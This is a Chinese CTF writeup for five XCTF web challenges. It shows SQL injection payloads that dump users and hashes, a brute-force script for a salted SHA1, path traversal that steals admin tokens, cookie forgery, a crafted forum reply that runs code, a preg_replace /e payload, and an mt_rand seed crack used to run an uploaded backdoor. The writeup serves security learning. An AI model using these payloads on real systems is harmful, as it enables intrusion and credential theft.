---
title: XCTF攻防世界web部分writeup
date: 2019-05-01 18:15:34
tags: writeup
---

adword里面题目很多，挑一些题目来记录



## FlatScience

进入题目界面

![](https://qqx.im/mdimage/adword/paper.png)

随便点点之后，发现是一些网站。对付这种，使用Burpsuite的**Send to Spiders**功能



![](https://qqx.im/mdimage/adword/spider.png)

可以看到有login.php和admin.php和robots.txt，访问robots.txt里面也是login.php和admin.php,所以分别访问login.php和admin.php

看到**登录框**自然是想要SQL注入fuzz一波。提交admin'会**报错**

> **Warning**:  SQLite3::query(): Unable to prepare statement: 1, near "fa27f6dc1fec7b2c54fd77ce7f0118fb2a3ab180": syntax error in **/var/www/html/login.php** on line **47**

再提交admin' or '1'='1'--可以成功登录，跳到主页。发现还是没有什么，回登录界面查看。抓包提交发现源代码有tips

```
<!-- TODO: Remove ?debug-Parameter! -->
```

加上这个参数提交得到源码

```php
<?php
ob_start();
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">

<html>
<head>
<style>
blockquote { background: #eeeeee; }
h1 { border-bottom: solid black 2px; }
h2 { border-bottom: solid black 1px; }
.comment { color: darkgreen; }
</style>

<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<title>Login</title>
</head>
<body>


<div align=right class=lastmod>
Last Modified: Fri Mar  31:33:7 UTC 1337
</div>

<h1>Login</h1>

Login Page, do not try to hax here plox!<br>


<form method="post">
  ID:<br>
  <input type="text" name="usr">
  <br>
  Password:<br> 
  <input type="text" name="pw">
  <br><br>
  <input type="submit" value="Submit">
</form>

<?php
if(isset($_POST['usr']) && isset($_POST['pw'])){
        $user = $_POST['usr'];
        $pass = $_POST['pw'];

        $db = new SQLite3('../fancy.db');
        
        $res = $db->query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
    if($res){
        $row = $res->fetchArray();
    }
    else{
        echo "<br>Some Error occourred!";
    }

    if(isset($row['id'])){
            setcookie('name',' '.$row['name'], time() + 60, '/');
            header("Location: /");
            die();
    }

}

if(isset($_GET['debug']))
highlight_file('login.php');
?>
<!-- TODO: Remove ?debug-Parameter! --> 
```

简单的拼接逻辑，并且会在cookie中回显。

那就查看一下sqlite的注入方式，[参考链接](http://www.sohu.com/a/256295275_609556)

列数可以从代码中看出来为2，接下来爆表。sqlite没库的概念，可以直接获得表名

> usr=admin' union select 1,name from sqlite_master where type='table' limit 0,1--&pw=1

![](https://qqx.im/mdimage/adword/attack.png)

这里只有一个表，如果想报全部的表可以用burpsuite修改limit后面的参数。

接下来报列

> usr=admin' union select 1,sql from sqlite_master where type='table' limit 0,1--&pw=1

结果：

> name= CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))

看hint

> usr=2' union select 1,hint from Users where name='admin'--&pw=1

结果

> name= my fav word in my fav paper?!;

获得admin密码

> usr=2' union select 1,password from Users where name='admin'--&pw=1

结果

> 3fab54a50e770d830c0416df817567662a9dc85c

cmd5查不到，行吧，要去paper里找。一个一个找和一个一个单词去试，这题可能明年才做得出来。那就写个爬虫脚本和解析pdf单词爆破密码的脚本

爬虫脚本

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
# @Time    : 2019/5/1 11:19
# @Author  : wulasite
# @Email   : wulasite@gmail.com
# @File    : python.py
# @Software: PyCharm

import pybloom_live
import queue
import requests
import re
from urllib.parse import urljoin
from function import download_pdf,get_ext


target_url = 'http://111.198.29.45:45002/1/index.html'
q = queue.Queue()
# init the queue
q.put(target_url)
# bloom filter init
f = pybloom_live.BloomFilter(capacity=1000, error_rate=0.001)

# 布隆过滤器 去除重复url
def bloom(base_url, urls):
    for i in urls:
        new_url = urljoin(base_url, i)
        if not f.add(new_url):
            if get_ext(new_url) == '.pdf':
                download_pdf(new_url)
            else:
                q.put(new_url)



# 获取网页的所有内容
def get_content_urls(url):
    try:
        r = requests.get(url, timeout=15)
        text = r.text
        pattern = re.compile('<a.+?href=\"(.+?)\".+?>.+?<\/a>')
        urls = pattern.findall(text)
        # print(urls)
        bloom(url, urls)
    except requests.exceptions.MissingSchema as e:
        print("捕不完的异常")
    except requests.exceptions.ConnectTimeout as e:
        print("捕不完的异常")


if __name__ == '__main__':
    while not q.empty():
        url = q.get()
        print(url)
        get_content_urls(url)


```

用了一个队列和布隆过滤器，很快就爬完pdf了。

然后再写一个pdf解析器

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
# @Time    : 2019/5/1 11:19
# @Author  : wulasite
# @Email   : wulasite@gmail.com
# @File    : readpdf.py
# @Software: PyCharm

from pdfminer.pdfparser import PDFParser,PDFDocument
from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter
from pdfminer.converter import PDFPageAggregator
from pdfminer.layout import LTTextBoxHorizontal,LAParams
from pdfminer.pdfinterp import PDFTextExtractionNotAllowed
import os
import re
from function import get_sha1



def get_pdf():
    return [i for i in os.listdir("./tmp") if i.endswith("pdf")]


def convert_pdf_2_text(path):
    with open(path, 'rb') as fp:
        # 用文件对象来创建一个pdf文档分析器
        praser = PDFParser(fp)
        # 创建一个PDF文档
        doc = PDFDocument()
        # 连接分析器 与文档对象
        praser.set_document(doc)
        doc.set_parser(praser)

        # 提供初始化密码
        # 如果没有密码 就创建一个空的字符串
        doc.initialize()

        # 检测文档是否提供txt转换，不提供就忽略
        if not doc.is_extractable:
            raise PDFTextExtractionNotAllowed
        else:
            # 创建PDf 资源管理器 来管理共享资源
            rsrcmgr = PDFResourceManager()
            # 创建一个PDF设备对象
            laparams = LAParams()
            device = PDFPageAggregator(rsrcmgr, laparams=laparams)
            # 创建一个PDF解释器对象
            interpreter = PDFPageInterpreter(rsrcmgr, device)

            res = ''
            # 循环遍历列表，每次处理一个page的内容
            for page in doc.get_pages():
                interpreter.process_page(page)
                # 接受该页面的LTPage对象
                layout = device.get_result()
                # 这里layout是一个LTPage对象 里面存放着 这个page解析出的各种对象 一般包括LTTextBox, LTFigure, LTImage, LTTextBoxHorizontal 等等 想要获取文本就获得对象的text属性，
                for x in layout:
                    if isinstance(x, LTTextBoxHorizontal):
                        res += x.get_text().strip()
                        # print(res)
            return res


def find_password():
    pdf_path = get_pdf()

    for i in pdf_path:
        print("Searching word in " + i)
        pdf_text = convert_pdf_2_text('tmp/'+i)
        # 这里的分隔符用空格和回车就够了，主要是分割出单词
        pdf_text = re.split(' | \n', pdf_text)
        for word in pdf_text:
            print(word)
            enc_word = word + 'Salz!'
            sha1_password = get_sha1(enc_word)
            if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c':
                print("Find the password :" + word)
                exit()

if __name__ == '__main__':
    find_password()

```

```python

def get_sha1(s):
    return hashlib.sha1(str(s).encode('utf-8')).hexdigest()
    
def download_pdf(url):
    r = requests.get(url, stream=True, timeout=15)

    filename = os.path.basename(url)
    with open('tmp/'+filename, 'wb') as fd:
        fd.write(r.content)
```

这脚本写了挺久，主要是一开始想着用多线程做生成者和消费者队列，结果发现爬虫本身就是自销自产。然后用布隆过滤器去重，防止爬虫死循环。

最后就可以跑出密码

>ThinJerboa
>Find the password :ThinJerboa

登录admin界面即可得到密码





## wtf.sh-150

访问题目界面，是个论坛

![](https://qqx.im/mdimage/adword/wtf.png)

探索了一下，有几个点

> 1. 有注册 登录功能
> 2. 有很多主题
> 3. 主题可以回复
> 4. 可以自己发布主题

既然有注册等等，那就是试试，顺便试试有没有SQL注入。FUZZ了一下，没有SQL注入，admin用户存在，flag可能跟admin有关。

对于有很多主题，那就是用Burpsuite的**Spider**看看有没有什么隐藏的东西。发现就是几个wtf模块，login post profile reply等。也没有试出什么信息。

第一波信息收集没收集到什么意思，而且与普通网站文件后缀也不同，是wtf。

回到题目首页，标题是

> Welcome to the wtf.sh Forums!

试着访问一下,发现显示出了wtf.sh的源码，审计一下

可以关注的点有几个

```bash
1. source lib.sh # import stdlib

2.	# include文件，如果是wtf文件 当成bash解析
    function include_page {
    # include_page <pathname>
    local pathname=$1
    local cmd=""
    [[ "${pathname:(-4)}" = '.wtf' ]];
    local can_execute=$?;
    page_include_depth=$(($page_include_depth+1))
    if [[ $page_include_depth -lt $max_page_include_depth ]]
    then
    local line;
    while read -r line; do
    # check if we're in a script line or not ($ at the beginning implies script line)
    # also, our extension needs to be .wtf
    [[ "$" = "${line:0:1}" && ${can_execute} = 0 ]];
    is_script=$?;

    # execute the line.
    if [[ $is_script = 0 ]]
    then
    cmd+=$'\n'"${line#"$"}";
    else
    if [[ -n $cmd ]]
    then
    eval "$cmd" || log "Error during execution of ${cmd}";
    cmd=""
    fi
    echo $line
    fi
    done < ${pathname}
    else
    echo "<p>Max include depth exceeded!<p>"
    fi
    }
3.  其它文件
	cp -R css index.wtf lib.sh login.wtf logout.wtf new_post.wtf new_user.wtf post.wtf post_functions.sh posts profile.wtf reply.wtf spinup.sh user_functions.sh users users_lookup wtf.sh "${sandbox_dir}";
```

根据上面的东西，先把其它源码给下下来审计。

```bash
1.lib.sh
	一些依赖函数
2.spinup.sh
	一些目录初始化的命令
3.user_functions.sh
	关于用户的一些操作，比如创建用户 登录等
4.post_functions.sh
	这里面有两个函数，一个是create_post,另一个是reply,根据函数名就可以猜得出功能
```

根据post_functions.sh里create_post的

```bash
local post_id=$(basename $(mktemp --directory posts/XXXXX));

echo ${username} > "posts/${post_id}/1";
echo ${title} >> "posts/${post_id}/1";
echo ${text} >> "posts/${post_id}/1";
```

可以知道，post_id是一个在posts下面的一个目录，并且会将内容写入该目录下的1文件里，而且没有做任何目录限制，那么就可以目录穿越，同时根据/post.wtf?post=K8laH是获取论坛主题内容，就可以知道会造成任意目录下的文件读取。

所以提交

```
http://111.198.29.45:44741/post.wtf?post=../
```

读取上一层的文件

![](https://qqx.im/mdimage/adword/wtf2.png)

内容过多，搜索一下flag关键字

![](https://qqx.im/mdimage/adword/get_flag1.png)

```bash
$ if is_logged_in && [[ "${COOKIES['USERNAME']}" = 'admin' ]] && [[ ${username} = 'admin' ]] 
$ then $ get_flag1 $ fi $ fi 
```

可以得知，如果以admin登录，就会获得flag1。关于获得admin权限，第一就是获得密码，第二就是获得cookie。之前user_functions.sh里有关于用户的函数，返回去看看可知

```bash
# user files look like:
# username
# hashed_pass
# token
echo "${username}" > "users/${user_id}";
echo "${hashed_pass}" >> "users/${user_id}";
echo "${token}" >> "users/${user_id}";
```

会把hash_pass和token放入users/${user_id}，既然这样就可以直接读取

```
?post=../users
```

![](https://qqx.im/mdimage/adword/admin_token.png)

密码破解不出，用修改cookie的方式

```
Cookie: USERNAME=admin; TOKEN=uYpiNNf/X0/0xNfqmsuoKFEtRlQDwNbS2T6LdHDRWH5p3x4bL4sxN0RMg17KJhAmTMyr8Sem++fldP0scW7g3w==
```

然后访问profile得到flag1

![](https://qqx.im/mdimage/adword/admin_get_flag.png)

读了一下其它文件，发现没有get_flag2，所以应该就是要执行命令了。

结合wtf.sh的.wtf文件解析，就是要上传一个wtf文件。在post_funtions里reply提供了这个机会

```bash
function reply {
local post_id=$1;
local username=$2;
local text=$3;
local hashed=$(hash_username "${username}");

curr_id=$(for d in posts/${post_id}/*; do basename $d; done | sort -n | tail -n 1);
next_reply_id=$(awk '{print $1+1}' <<< "${curr_id}");
next_file=(posts/${post_id}/${next_reply_id});
echo "${username}" > "${next_file}";
echo "RE: $(nth_line 2 < "posts/${post_id}/1")" >> "${next_file}";
echo "${text}" >> "${next_file}";

# add post this is in reply to to posts cache
echo "${post_id}/${next_reply_id}" >> "users_lookup/${hashed}/posts";
}
```

post_id是可控的，username text可控，

所以先注册一个$get_flag2用户，这是wtf解析导致的，$开头会被解析成bash。

然后抓包提交

```
// 这里的%20是空格，为了让echo "${username}" > posts/1.wtf /${next_reply_id}截断，这样我们的1.wtf就不会被当成文件夹，而是被当成文件，不存在也会被创建，然后写入
// 之所以写入users_lookup是因为users_lookup文件夹下面没有建立.nolist .noread,而posts下面有，所以无法访问其下的wtf。
POST /reply.wtf?post=../users_lookup/1.wtf%20
xxx

text=123456&submit=
```

然后访问users_lookup/1.wtf

![](https://qqx.im/mdimage/adword/get_flag2.png)



## ics-04

题目提示

> 工控云管理系统新添加的登录和注册页面存在漏洞，请找出flag。

那就直接开始怼登录和注册功能。

有注册登录功能的题目，当然是先试注册功能。

FUZZ了一番发现，没有SQL注入，注册的时候没有检查用户是否存在，所以可以重复注册。所以注册一个admin登录试试。登录成功之后提示

> 普通用户登录成功,没什么用

那看来得找管理员账户，但是又不是admin。测试一下登录功能也没有发现SQL注入。但是还有个忘记密码的功能。

![](https://qqx.im/mdimage/adword/cetc_forget.png)

测试了一波发现有SQL注入，并且没有啥过滤。

在我确定列数之后，在尝试使用

```
0' union select 1,2,databaser(),4#
```

发现好像database()函数被禁用了。那怎么办？猜，不太现实。如果还记得爆表和列的库information_schema里面存有库和表的信息，就可以利用这个。

提交

```
0' union select 1,2,GROUP_CONCAT(DISTINCT TABLE_SCHEMA),4 from information_schema.columns #
```

返回

```
information_schema,cetc004,mysql,performance_schema
```

根据结果返回提交

```
0' union select 1,2,GROUP_CONCAT(DISTINCT TABLE_NAME),4 from information_schema.columns where table_schema='cetc004' #
```

返回

```
user
```

再提交

```
0' union select 1,2,GROUP_CONCAT(DISTINCT COLUMN_NAME),4 from information_schema.columns where TABLE_NAME='user' and  table_schema='cetc004'#
```

返回

```
username,password,question,answer
```

管理员用户应该是第一个，直接取应该可以

```
0' union select 1,2,concat(username,',',password),4 from cetc004.user#
```

返回

```
c3tlwDmIn23,2f8667f381ff50ced6a3edc259260ba9
```

密码查不出，但是可以根据之前提到的，重复注册漏洞，再注册一个c3tlwDmIn23，登录即可拿到flag

扩展一下，如果information_schema被过滤了，如果没有报错回显，似乎就只能爆破了，如果有报错回显，可以参考一下[这篇文章](https://www.secpulse.com/archives/68991.html)



## cis-05

这题比较简单，主要记录一下

```php
if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {

    echo "<br >Welcome My Admin ! <br >";

    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];

    if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }

}
```

遇到这种可能存在漏洞的地方且不懂的函数，就去查php.net或者百度，可以看到preg_replace这个函数的pattern参数的/e

>*e* (*PREG_REPLACE_EVAL*)
>
>Warning
>
>This feature was *DEPRECATED* in PHP 5.5.0, and *REMOVED* as of PHP 7.0.0.
>
>如果设置了这个被弃用的修饰符， [preg_replace()](https://www.php.net/manual/zh/function.preg-replace.php) 在进行了对替换字符串的 后向引用替换之后, 将替换后的字符串作为php 代码评估执行**(eval 函数方式)****，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线(*\*)和 NULL 字符在 后向引用替换时会被用反斜线转义.

所以如果是

>preg_replace('/(.*)/e','system("ls")','xxxxx')

就会执行system("ls")



## GUESS

访问题目界面

![](https://qqx.im/mdimage/adword/guess_upload.png)

提示

> please upload an IMAGE file (gif|jpg|jpeg|png)

尝试提交一个图片，地址变成了

> /?page=upload

试着包含文件读源码，可以得到index.php和upload.php

```php
<?php
error_reporting(0);
function show_error_message($message)
{
    die("<div class=\"msg error\" id=\"message\">
    <i class=\"fa fa-exclamation-triangle\"></i>$message</div>");
}

function show_message($message)
{
    echo("<div class=\"msg success\" id=\"message\">
    <i class=\"fa fa-exclamation-triangle\"></i>$message</div>");
}

function random_str($length = "32")
{
    $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F",
        "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L",
        "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R",
        "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X",
        "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
    $str = '';

    for ($i = 1; $i <= $length; ++$i) {
        $ch = mt_rand(0, count($set) - 1);
        $str .= $set[$ch];
    }

    return $str;
}

session_start();



$reg='/gif|jpg|jpeg|png/';
if (isset($_POST['submit'])) {

    $seed = rand(0,999999999);
    mt_srand($seed);
    $ss = mt_rand();
    $hash = md5(session_id() . $ss);
    setcookie('SESSI0N', $hash, time() + 3600);

    if ($_FILES["file"]["error"] > 0) {
        show_error_message("Upload ERROR. Return Code: " . $_FILES["file-upload-field"]["error"]);
    }
    $check2 = ((($_FILES["file-upload-field"]["type"] == "image/gif")
            || ($_FILES["file-upload-field"]["type"] == "image/jpeg")
            || ($_FILES["file-upload-field"]["type"] == "image/pjpeg")
            || ($_FILES["file-upload-field"]["type"] == "image/png"))
        && ($_FILES["file-upload-field"]["size"] < 204800));
    $check3=!preg_match($reg,pathinfo($_FILES['file-upload-field']['name'], PATHINFO_EXTENSION));


    if ($check3) show_error_message("Nope!");
    if ($check2) {
        $filename = './uP1O4Ds/' . random_str() . '_' . $_FILES['file-upload-field']['name'];
        if (move_uploaded_file($_FILES['file-upload-field']['tmp_name'], $filename)) {
            show_message("Upload successfully. File type:" . $_FILES["file-upload-field"]["type"]);
        } else show_error_message("Something wrong with the upload...");
    } else {
        show_error_message("only allow gif/jpeg/png files smaller than 200kb!");
    }
}
?>
```

看起来上传图片也没什么漏洞，但是结合文件包含漏洞就可以执行代码，这是2016SWPU一道题类似的思路。但是这里不太一样，这里上传的图片的文件名是随机的。但事实上，php的随机是可以破解的，用[cracker](https://www.openwall.com/php_mt_seed/)破解种子,用法看README。看代码，如果知道随机出来的第一个数->破解出种子->知道seed->重现文件名。

但是第一个数又和一个奇怪的东西粘在一起

```php
$ss = mt_rand();
$hash = md5(session_id() . $ss);
setcookie('SESSI0N', $hash, time() + 3600);
```

这个session_id()是啥呢？就是我们提交过来的PHPSESSID=xxxxxx。如果为空就可以很容易的破解了。

所以老步骤：制造一个后门hello.php->压缩成hello.zip->重命名成hello.png->空PHPSESSID上传图片获得SESSI0N->破解出seed->破解文件名

实践过程中遇到的一个比较大的问题就是不知道服务器php版本，只能一个一个的试了

![](https://qqx.im/mdimage/adword/guess_back.png)

返回的

> SESSI0N=3d097941ce294aebbcf61c4ab9ea5499

去cmd5破解出第一个随机数

> 429127491

所以去crack出seed

> (base) root@VM-0-11-ubuntu:~/php_mt_seed-4.0# ./php_mt_seed 429127491
> Pattern: EXACT
> Version: 3.0.7 to 5.2.0
> Found 0, trying 0xfc000000 - 0xffffffff, speed 2692.9 Mseeds/s
> Version: 5.2.1+
> Found 0, trying 0x06000000 - 0x07ffffff, speed 15.6 Mseeds/s
> seed = 0x07a89d59 = 128490841 (PHP 5.2.1 to 7.0.x; HHVM)
> Found 1, trying 0x8c000000 - 0x8dffffff, speed 15.6 Mseeds/s 128490841
> seed = 0x8c438db1 = 2353237425 (PHP 7.1.0+)
> Found 2, trying 0xfe000000 - 0xffffffff, speed 15.6 Mseeds/s

最后试出来的是PHP 5.2.1 to 7.0.x的128490841

所以模拟源代码跑出文件名前缀

```php
<?php
    $seed = "128490841";
    mt_srand($seed);
    $ss = mt_rand();
    $session_id="";
    $hash1 = md5($session_id. $ss);
	// 这里的hash2只是为了验证最终得出的数是否是返回的SESSI0N
    $hash2 = "3d097941ce294aebbcf61c4ab9ea5499";
    if($hash1===$hash2){
        echo './uP1O4Ds/' . random_str() . '_';
    }
    else {
        echo "";
    }


    function random_str($length = "32")
    {
        $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F",
            "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L",
            "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R",
            "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X",
            "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");
        $str = '';

        for ($i = 1; $i <= $length; ++$i) {
            $ch = mt_rand(0, count($set) - 1);
            $str .= $set[$ch];
        }

        return $str;
    }

```

跑出的是

```
./uP1O4Ds/BfRZNJmJR2B8Zyz5XSWH6V9Xv3cb2g9T_
```

所以访问

> ?page=phar://uP1O4Ds/BfRZNJmJR2B8Zyz5XSWH6V9Xv3cb2g9T_hello.png/hello

就可以运行代码了

所以PHP的随机数要是知道某些特定的条件的时候，就可以破解出seed了。





\>\>**To be continue**




